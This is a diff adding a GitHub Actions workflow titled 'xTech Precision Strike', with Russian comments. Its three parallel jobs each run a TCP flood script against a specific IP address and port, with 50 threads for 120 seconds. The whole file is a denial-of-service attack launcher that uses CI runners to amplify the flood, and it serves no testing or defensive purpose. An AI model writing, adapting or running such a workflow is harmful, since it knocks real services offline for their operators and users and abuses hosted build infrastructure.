@@ -1,0 +1,24 @@
+name: xTech Precision Strike
+
+on:
+  workflow_dispatch:
+
+jobs:
+  strike:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3]  # Три параллельных сокета для усиления
+    steps:
+      - name: Checkout Arsenal
+        uses: actions/checkout@v4
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Execute TCP Flood on Target
+        run: |
+          echo "[xTech] Target locked: 77.110.105.224:8303"
+          # Стандартный запуск: python TCP-Flood.py <IP> <PORT> <THREADS> <DURATION>
+          # Если скрипт ожидает другой порядок аргументов, поправим по ходу.
+          python TCP-Flood.py 77.110.105.224 8303 50 120
